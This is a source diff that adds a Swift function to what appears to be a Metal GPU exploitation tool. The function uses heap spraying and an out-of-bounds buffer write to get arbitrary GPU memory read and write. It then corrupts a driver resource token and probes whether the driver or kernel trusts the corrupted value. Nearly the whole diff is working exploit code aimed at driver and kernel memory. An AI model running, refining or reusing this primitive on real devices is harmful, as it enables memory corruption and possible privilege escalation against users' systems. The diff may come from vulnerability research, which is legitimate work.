@@ -3569,6 +3569,177 @@ func runGPUStructDump(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
+// ── runHit2Write ──────────────────────────────────────────────────────────────
+// GPU write to hit2 (0x1500088000) field +0020 — the resource token.
+//
+// hit2 is a 40-byte Metal runtime descriptor with 5 non-zero fields.
+// +0020 = 0x4000000060000160 — packed resource token; bit 62 = flag,
+// lower 32 bits encode a surface/resource ID or slot (0x60000160).
+//
+// Strategy:
+//   1. GPU read +0020 → verify baseline
+//   2. GPU write 0xDEADC0DECAFE0160 (same lower bits, corrupted flags)
+//   3. Submit a Metal compute command → observe if Metal driver errors differently
+//   4. GPU read +0020 → verify write landed
+//   5. Restore original value
+//
+// Observable effects:
+//   - Metal error code changes → driver read our corrupted token
+//   - Kernel panic → kernel trusted our token → kernel data corruption
+//   - No change → token not read during command submission (try other fields)
+// ─────────────────────────────────────────────────────────────────────────────
+func runHit2Write(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        func step(_ s: String) { log.append(s) }
+        step("── Hit2 Resource Token Write ──")
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ no device"); completion(); return }
+        let BUF_LEN = 4096
+        let HIT2_VA: UInt64  = 0x1500088000
+        let TOKEN_OFF        = 0x20   // +0020: resource token field
+        let BASELINE_TOKEN: UInt64 = 0x4000000060000160
+        let CORRUPT_TOKEN:  UInt64 = 0xDEADC0DE60000160  // same lower 32 bits, corrupted upper
+
+        // Spray → lo/hi pair
+        var loRef: MTLBuffer?
+        var nextGPUVA: UInt64 = 0
+        var keepAlives: [any MTLBuffer] = []
+        for _ in 0..<2048 {
+            guard let a = device.makeBuffer(length: BUF_LEN, options: .storageModeShared) else { continue }
+            if let prev = keepAlives.last, a.gpuAddress == prev.gpuAddress + UInt64(BUF_LEN) {
+                loRef = prev; nextGPUVA = a.gpuAddress; break
+            }
+            keepAlives.append(a)
+        }
+        guard let lo = loRef else { step("✗ spray miss"); completion(); return }
+        step("✓ lo=0x\(String(lo.gpuAddress, radix: 16))")
+        let loPtr = lo.contents().assumingMemoryBound(to: UInt8.self)
+
+        guard let hi  = device.makeBuffer(length: BUF_LEN, options: .storageModeShared),
+              let out = device.makeBuffer(length: 64,       options: .storageModeShared) else {
+            step("✗ hi/out alloc"); completion(); return
+        }
+
+        func oobWriteVA(_ idx: Int, _ va: UInt64) {
+            let off = idx * 8
+            for bi in 0..<8 { loPtr[BUF_LEN+off+bi] = UInt8((va >> (bi*8)) & 0xFF) }
+        }
+
+        // READ kernel — reads single VA and returns value
+        let readSrc = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct Probe { device ulong* buf; };
+        kernel void gpuRead(device Probe* p [[buffer(0)]], device ulong* out [[buffer(1)]]) {
+            out[0] = p[0].buf[0];
+        }
+        """
+        // WRITE kernel — writes src[0] to p[0].buf
+        let writeSrc = """
+        #include <metal_stdlib>
+        using namespace metal;
+        struct Probe { device ulong* buf; };
+        kernel void gpuWrite(device Probe* p [[buffer(0)]], device ulong* src [[buffer(1)]]) {
+            p[0].buf[0] = src[0];
+        }
+        """
+        guard let rLib = try? device.makeLibrary(source: readSrc,  options: nil),
+              let rFn  = rLib.makeFunction(name: "gpuRead"),
+              let rPso = try? device.makeComputePipelineState(function: rFn),
+              let wLib = try? device.makeLibrary(source: writeSrc, options: nil),
+              let wFn  = wLib.makeFunction(name: "gpuWrite"),
+              let wPso = try? device.makeComputePipelineState(function: wFn) else {
+            step("✗ read/write PSO failed"); completion(); return
+        }
+        step("✓ read/write PSOs ready")
+
+        let srcBuf = device.makeBuffer(length: 8, options: .storageModeShared)!
+
+        func gpuReadAt(_ targetVA: UInt64) -> (Bool, UInt64) {
+            oobWriteVA(0, targetVA)
+            out.contents().initializeMemory(as: UInt64.self, repeating: 0xEE, count: 1)
+            guard let q = device.makeCommandQueue(), let cb = q.makeCommandBuffer(),
+                  let enc = cb.makeComputeCommandEncoder() else { return (false, 0) }
+            enc.setComputePipelineState(rPso)
+            enc.setBuffer(hi, offset: 0, index: 0)
+            enc.setBuffer(out, offset: 0, index: 1)
+            let sz = MTLSize(width: 1, height: 1, depth: 1)
+            enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
+            enc.endEncoding(); cb.commit(); cb.waitUntilCompleted()
+            if cb.error != nil { return (true, 0) }
+            return (false, out.contents().assumingMemoryBound(to: UInt64.self)[0])
+        }
+
+        func gpuWriteAt(_ targetVA: UInt64, value: UInt64) -> Bool {
+            oobWriteVA(0, targetVA)
+            srcBuf.contents().assumingMemoryBound(to: UInt64.self)[0] = value
+            guard let q = device.makeCommandQueue(), let cb = q.makeCommandBuffer(),
+                  let enc = cb.makeComputeCommandEncoder() else { return false }
+            enc.setComputePipelineState(wPso)
+            enc.setBuffer(hi,     offset: 0, index: 0)
+            enc.setBuffer(srcBuf, offset: 0, index: 1)
+            let sz = MTLSize(width: 1, height: 1, depth: 1)
+            enc.dispatchThreads(sz, threadsPerThreadgroup: sz)
+            enc.endEncoding(); cb.commit(); cb.waitUntilCompleted()
+            return cb.error == nil
+        }
+
+        let tokenVA = HIT2_VA + UInt64(TOKEN_OFF)
+
+        // ── Step 1: verify hit2 is present and read baseline token ──
+        step("── step 1: read hit2+0020 baseline ──")
+        let (rf, rBaseline) = gpuReadAt(tokenVA)
+        step("  hit2+0020 = 0x\(String(rBaseline, radix: 16)) \(rf ? "(FAULT)" : "")")
+        step("  expected:   0x\(String(BASELINE_TOKEN, radix: 16)) \(rBaseline == BASELINE_TOKEN ? "✓ match" : "⚠ different from last run")")
+
+        // ── Step 2: GPU write corrupt token ──
+        step("── step 2: GPU write 0x\(String(CORRUPT_TOKEN, radix: 16)) → hit2+0020 ──")
+        let writeOK = gpuWriteAt(tokenVA, value: CORRUPT_TOKEN)
+        step("  write dispatch: \(writeOK ? "✓ no fault" : "✗ faulted")")
+
+        // ── Step 3: read back to verify write landed ──
+        step("── step 3: verify write ──")
+        let (_, rAfter) = gpuReadAt(tokenVA)
+        step("  hit2+0020 now = 0x\(String(rAfter, radix: 16))")
+        if rAfter == CORRUPT_TOKEN {
+            step("  ★★ GPU WRITE TO METAL DRIVER STRUCT: token corrupted from 0x\(String(BASELINE_TOKEN, radix: 16)) → 0x\(String(CORRUPT_TOKEN, radix: 16))")
+        } else if rAfter == rBaseline {
+            step("  ⚠ write did not stick — struct may be read-only or IOMMU blocked write")
+        }
+
+        // ── Step 4: submit a Metal command after corruption ──
+        step("── step 4: submit Metal compute after corruption → observe driver behavior ──")
+        guard let testBuf = device.makeBuffer(length: 64, options: .storageModeShared) else {
+            step("✗ testBuf alloc"); completion(); return
+        }
+        testBuf.contents().initializeMemory(as: UInt8.self, repeating: 0xAA, count: 64)
+        guard let q4 = device.makeCommandQueue(), let cb4 = q4.makeCommandBuffer(),
+              let enc4 = cb4.makeComputeCommandEncoder() else {
+            step("⚠ can't create encoder after corruption"); completion(); return
+        }
+        enc4.setComputePipelineState(rPso)
+        enc4.setBuffer(hi,      offset: 0, index: 0)
+        enc4.setBuffer(testBuf, offset: 0, index: 1)
+        let sz4 = MTLSize(width: 1, height: 1, depth: 1)
+        enc4.dispatchThreads(sz4, threadsPerThreadgroup: sz4)
+        enc4.endEncoding(); cb4.commit(); cb4.waitUntilCompleted()
+        if let err4 = cb4.error as NSError? {
+            step("  Metal error after corruption: code=\(err4.code) \(err4.localizedDescription.prefix(120))")
+            step("  ★ different error = driver READ the corrupted field during command processing")
+        } else {
+            step("  Metal: no error (driver may not read this field during compute submission)")
+        }
+
+        // ── Step 5: restore original token ──
+        step("── step 5: restore original token ──")
+        _ = gpuWriteAt(tokenVA, value: BASELINE_TOKEN)
+        let (_, rRestored) = gpuReadAt(tokenVA)
+        step("  hit2+0020 restored = 0x\(String(rRestored, radix: 16)) \(rRestored == BASELINE_TOKEN ? "✓" : "⚠ mismatch")")
+
+        step("── Hit2 Resource Token Write complete ──")
+        completion()
+    }
+}
+
 // ── runGPUVAScan ──────────────────────────────────────────────────────────────
 // Sweep GPU VA space with the read redirect primitive to locate Metal driver /
 // kernel-mapped regions not visible from userspace.
